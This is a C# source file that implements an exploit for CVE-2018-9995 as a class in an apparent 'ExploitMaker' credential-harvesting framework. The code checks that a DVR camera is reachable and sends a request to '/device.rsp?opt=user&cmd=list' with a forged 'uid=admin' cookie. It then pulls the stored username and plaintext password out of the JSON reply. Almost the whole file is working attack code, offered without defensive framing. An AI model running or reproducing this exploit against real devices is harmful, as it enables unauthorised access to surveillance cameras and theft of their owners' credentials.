using System.Collections.Generic;
using ExploitMaker;
using ExploitMaker.Exceptions;
using ExploitMaker.Helpers;
using Microsoft.CSharp.RuntimeBinder;

namespace Exploits
{
    public class CVE_2018_9995 : Exploit
    {
        public override string Description => CommonName + ": Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'";

        public override string CommonName => "CVE-2018-9995";

        public override Credencial Run(Camera cam)
        {
            try
            {
                //Try to connect, if we fail, because we do not get a response, the server is unreachable.
                //We wiil receive a JSON response, if it is not a JSON response, we will get an exception.
                
                if (!ConnectionHelper.IsOpenPort(cam.Host, int.Parse(cam.Port)))
                {
                    var notReachMsg = string.Format(Phrases.IP_Camera_Is_Not_Reachable, cam.Address, CommonName);
                    throw new ExploituUreachableTargetException(notReachMsg, cam, CommonName);
                }
                
                var result = HttpHelper.Get(cam.UrlHttp + "/device.rsp?opt=user&cmd=list", new Dictionary<string, string> {{"uid", "admin"}});
                if (result == null)
                {
                    var notReachMsg = string.Format(Phrases.IP_Camera_Is_Not_Reachable, cam.Address, CommonName);
                    throw new ExploituUreachableTargetException(notReachMsg, cam, CommonName);
                }

                //We parse the JSON response to read the fields, if we get an error, is because the cam is not vulnerable, because the response is invalid
                dynamic json = result;
                string username = json.list[0].uid;
                string pass = json.list[0].pwd;
                if (username != null && pass != null)
                    return new Credencial(username, pass);
                
                return null;
            }
            catch (JsonParserErrorException ex)
            {
                //The server responds, but is not a JSON response.
                var error = string.Format("Error on parse JSON in the Cam: {0} for Exploit: {1}, Message: ", cam.Address, CommonName) + ex.Message;
                throw new ExploitFailException(error.Replace("\n", " "), cam, CommonName);
            }
            catch (RuntimeBinderException)
            {
                //The server responds, the JSON files are invalid.
                return null;
            }
        }
    }
}